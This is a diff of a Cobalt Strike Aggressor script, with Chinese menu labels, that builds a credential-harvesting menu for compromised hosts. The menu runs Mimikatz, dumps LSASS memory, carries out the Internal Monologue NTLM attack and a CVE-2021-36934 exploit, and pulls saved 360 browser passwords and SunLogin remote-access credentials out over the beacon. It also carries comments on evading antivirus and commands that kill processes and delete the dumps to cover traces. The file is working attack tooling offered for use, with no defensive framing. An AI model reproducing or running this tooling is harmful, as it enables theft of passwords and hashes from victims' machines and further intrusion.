@@ -1,5 +1,5 @@
 menu "☆ 凭据获取" {
-  menu "Mimikatz" {
+  menu "Mimikatz 相关" {
     item "Logonpasswords" {
 			blog($1, "\c9=========== Logonpasswords ==========");
       $bid = $1['@'];
@@ -181,80 +181,83 @@ menu "☆ 凭据获取" {
       bmimikatz($1, "sekurlsa::credman");
     }    
   }
-	menu "LsassDump (WinAPI)" {   # https://github.com/Ryze-T/Windows_API_Tools
-    item "上传 LsassDump" {
-			blog($1, "\c9=========== 上传 LsassDump ==========");
-      $bid = $1;
-      $dialog = dialog("上传 LsassDump", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &LDupload);
-      dialog_description($dialog, "使用 WindowsAPI 读取 lsass.exe，为保证免杀效果请Dump成功后及时删除!");
-      drow_text($dialog, "UploadPath",  "上传路径: ");
-      dbutton_action($dialog, "上传");
+
+  menu "DumpHash 相关" {
+    menu "LsassDump (WinAPI)" {   # https://github.com/Ryze-T/Windows_API_Tools
+      item "上传 LsassDump" {
+        blog($1, "\c9=========== 上传 LsassDump ==========");
+        $bid = $1;
+        $dialog = dialog("上传 LsassDump", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &LDupload);
+        dialog_description($dialog, "使用 WindowsAPI 读取 lsass.exe，为保证免杀效果请Dump成功后及时删除!");
+        drow_text($dialog, "UploadPath",  "上传路径: ");
+        dbutton_action($dialog, "上传");
+        dialog_show($dialog);
+      }
+      sub LDupload{
+        bcd($bid, $3['UploadPath']);
+        if (-is64 $bid['id']) {
+          bupload($bid, script_resource("/scripts/PassCapture/LsassDump/x64/LsassDump.exe"));
+        }else{
+          bupload($bid, script_resource("/scripts/PassCapture/LsassDump/x86/LsassDump.exe"));
+        }
+        btask($bid, "使用 WindowsAPI 读取 lsass.exe，为保证免杀效果请Dump成功后及时删除！");
+      }   
+      item "运行 LsassDump" {
+        blog($1, "\c9=========== 运行 LsassDump ==========");
+        bshell($bid, "LsassDump.exe");
+      }
+      item "删除 LsassDump" {
+        blog($1, "\c9=========== 删除 LsassDump ==========");
+        local('$bid');
+        foreach $bid ($1){
+          bshell($1, "taskkill -f /im LsassDump.exe & del /f /s /q LsassDump.exe & del /f /s /q 1.dmp");
+        }
+      }
+    }
+    item "SharpMimidump（远程读取.dmp）" {
+        blog($1, "\c9=========== SharpMimidump（远程读取.dmp） =========="); # https://github.com/cube0x0/Mimidump
+      btask($bid, "使用 Mimidump 远程读取转储的 C:\\Windows\\Temp\\1.dmp（.net 4.5）");
+      bexecute_assembly($1, script_resource('/scripts/PassCapture/Minidump.exe') ,"C:\\Windows\\Temp\\1.dmp");
+    }
+    item "Internal-Monologue" {
+        blog($1, "\c9=========== Internal-Monologue ==========");# 参考 https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D
+      local('$bid');
+          foreach $bid ($1){
+          internal_monologue($bid);
+          }
+    }
+    sub internal_monologue{
+      $binary = script_resource("/scripts/PassCapture/InternalMonologue.exe");
+      $help = "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS";
+      beacon_command_register("lazagne", $help, "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS.\n\n$help");
+      if(!-exists $binary)
+      {
+        berror($1, "InternalMonologue binary cannot be found at $binary");
+        return;
+      }
+      $args = "-Downgrade True -Verbose True";
+      bexecute_assembly($1, $binary, $args);
+    }  
+    item "DumpLsassMemory"{
+        $dialog = dialog("DumpLsassMemory",%(bid => $1["@"] , pid => "1024") ,&DumpLsassMemorys);
+      dialog_description($dialog,"请输入Lsass's pid");
+      drow_text($dialog,"pid","pid:");
+      dbutton_action($dialog,"Exploit");
       dialog_show($dialog);
     }
-    sub LDupload{
-      bcd($bid, $3['UploadPath']);
-      if (-is64 $bid['id']) {
-        bupload($bid, script_resource("/scripts/PassCapture/LsassDump/x64/LsassDump.exe"));
-      }else{
-        bupload($bid, script_resource("/scripts/PassCapture/LsassDump/x86/LsassDump.exe"));
-      }
-      btask($bid, "使用 WindowsAPI 读取 lsass.exe，为保证免杀效果请Dump成功后及时删除！");
-    }   
-    item "运行 LsassDump" {
-			blog($1, "\c9=========== 运行 LsassDump ==========");
-      bshell($bid, "LsassDump.exe");
+    sub DumpLsassMemorys{
+        $binary = script_resource("/scripts/PassCapture/MiniDumpLsass.exe");
+        bexecute_assembly($3["bid"],$binary,$3['pid']);
     }
-    item "删除 LsassDump" {
-			blog($1, "\c9=========== 删除 LsassDump ==========");
-      local('$bid');
-      foreach $bid ($1){
-        bshell($1, "taskkill -f /im LsassDump.exe & del /f /s /q LsassDump.exe & del /f /s /q 1.dmp");
-      }
-    }
-  }
-  item "SharpMimidump（远程读取.dmp）" {
-			blog($1, "\c9=========== SharpMimidump（远程读取.dmp） =========="); # https://github.com/cube0x0/Mimidump
-    btask($bid, "使用 Mimidump 远程读取转储的 C:\\Windows\\Temp\\1.dmp（.net 4.5）");
-    bexecute_assembly($1, script_resource('/scripts/PassCapture/Minidump.exe') ,"C:\\Windows\\Temp\\1.dmp");
-  }
-	item "Internal-Monologue" {
-			blog($1, "\c9=========== Internal-Monologue ==========");# 参考 https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D
-    local('$bid');
-        foreach $bid ($1){
-        internal_monologue($bid);
-        }
-	}
-  sub internal_monologue{
-    $binary = script_resource("/scripts/PassCapture/InternalMonologue.exe");
-    $help = "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS";
-    beacon_command_register("lazagne", $help, "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS.\n\n$help");
-    if(!-exists $binary)
-    {
-      berror($1, "InternalMonologue binary cannot be found at $binary");
-      return;
-    }
-    $args = "-Downgrade True -Verbose True";
-    bexecute_assembly($1, $binary, $args);
-  }  
-  item "DumpLsassMemory"{
-      $dialog = dialog("DumpLsassMemory",%(bid => $1["@"] , pid => "1024") ,&DumpLsassMemorys);
-    dialog_description($dialog,"请输入Lsass's pid");
-    drow_text($dialog,"pid","pid:");
-    dbutton_action($dialog,"Exploit");
-    dialog_show($dialog);
-  }
-  sub DumpLsassMemorys{
-      $binary = script_resource("/scripts/PassCapture/MiniDumpLsass.exe");
-      bexecute_assembly($3["bid"],$binary,$3['pid']);
-  }
 
-  item "CVE-2021-36934 (Win10GetHash)"{
-    $binary = script_resource("/scripts/PassCapture/CVE-2021-36934.exe");
-    bexecute_assembly($1["@"],$binary);
-  }
+    item "CVE-2021-36934"{
+      $binary = script_resource("/scripts/PassCapture/CVE-2021-36934.exe");
+      bexecute_assembly($1["@"],$binary);
+    }
+  }  
   separator();
 
-	menu "LaZagne 检索主机密码" {   # https://github.com/AlessandroZ/LaZagne
+	menu "LaZagne 检索主机密码" {
     item "上传 LaZagne" {
 			blog($1, "\c9=========== 上传 LaZagne ==========");
       $bid = $1;
@@ -323,7 +326,59 @@ menu "☆ 凭据获取" {
           bshell($1, "del /f /s /q hack-browser-data.exe && rmdir /s /q results");
         }
       }
-    }      
+    }
+    menu "360SafeBrowsergetpass" {
+      sub getMachineGuid{
+        $arch = barch($1);
+        if ($arch == 'x64'){
+        breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x64");
+        }
+        else{
+        breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x86");
+        breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x64");
+        }
+      }
+
+      sub SafeBrowsergetpass {
+        bshell($bid, 'reg query HKEY_CLASSES_ROOT\360seURL\shell\open\command|findstr exe');
+      }
+
+      item "查询相关键值"{
+          $bid = $1['@'];
+          SafeBrowsergetpass($bid);
+          getMachineGuid($bid);
+      }
+
+      on beacon_output {
+        $magicstring = "360se6\\Application\\360se.exe";
+        $magicstring2 = "MachineGuid";
+
+        if ($magicstring isin $2){
+        $length = strlen($2);
+        $last = lindexOf($2, ":");
+        $res = substr($2, $last - 1, $length - 32);
+        $dbPath = "User Data\\Default\\apps\\LoginAssis\\assis2.db";
+        $res = $res . $dbPath;
+
+        bdownload($1, $res);
+        blog($1,"360 SafeBrowser DB Downloading");
+        }
+
+        if ($magicstring2 isin $2){
+        $lasta = lindexOf($2, "\nMachineGuid");
+        $MachineGuid = substr($2, $lasta + 26, -1); 
+        $beaconHost = beacon_info($1, "host");
+        credential_add($empty,$MachineGuid, $empty, $empty, $beaconHost);
+        blog($1,"MachineGuid Get Success");
+        }
+      }
+
+      item "Safe360Browsergetpass" {
+        blog($1, "\c9=========== Safe360Browsergetpass ==========");
+        blog($1, "项目地址：https://github.com/hayasec/360SafeBrowsergetpass")
+        bexecute_assembly($1, script_resource("/scripts/PassCapture/Safe360Browsergetpass.exe"),"/auto");      
+      }
+    }
     item "BrowserGhost" {
 			blog($1, "\c9=========== BrowserGhost ==========");
       blog($1, "项目地址：https://github.com/QAX-A-Team/BrowserGhost")
@@ -355,7 +410,11 @@ menu "☆ 凭据获取" {
     }   
   }
 
-  menu "本地程序文件密码解密" {
+  menu "主机程序相关密码" {
+    item "SunFlower(查询注册表键值)" {
+      blog($1, "\c9=========== SunFlower(查询注册表键值) ==========");
+      bshell!($1, "reg query HKEY_USERS\\.DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginInfo || reg query HKEY_USERS\\.DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginGreenInfo || echo 旧版向日葵 C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\config.ini && echo 绿色便携版 C:\\ProgramData\\Oray\\SunloginClient\\config.ini");
+    }
     item "SharpCloud(获取云凭证)" {
 			blog($1, "\c9=========== SharpCloud(获取云凭证) ==========");
       $bid = $1['@'];
@@ -447,8 +506,7 @@ menu "☆ 凭据获取" {
       bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpDecryptPwd40.exe"), $arg);
     }
   }
-
-  item "Net-GPPPassword (组策略帐户凭据)" {
+  item "Net-GPPPassword" {
 			blog($1, "\c9=========== Net-GPPPassword (组策略帐户凭据) ==========");
     blog($1, ".NET实现的Get-GPPPassword。检索通过组策略首选项推送的帐户的明文密码和其他信息。该技术很旧，但是在很早以前创建域的环境中仍然很有用。项目地址：https://github.com/outflanknl/Net-GPPPassword")
     bexecute_assembly($1, script_resource("/scripts/PassCapture/Net-GPPPassword_dotNET_v2.exe"), "");
@@ -474,7 +532,7 @@ menu "☆ 凭据获取" {
     }
   }
 
-  menu "修改注册表 Dump 明文密码" {
+  menu "改注册表 Dump 明文密码" {
     item "显示明文" {
 			blog($1, "\c9=========== 显示明文 ==========");
       local('$bid');
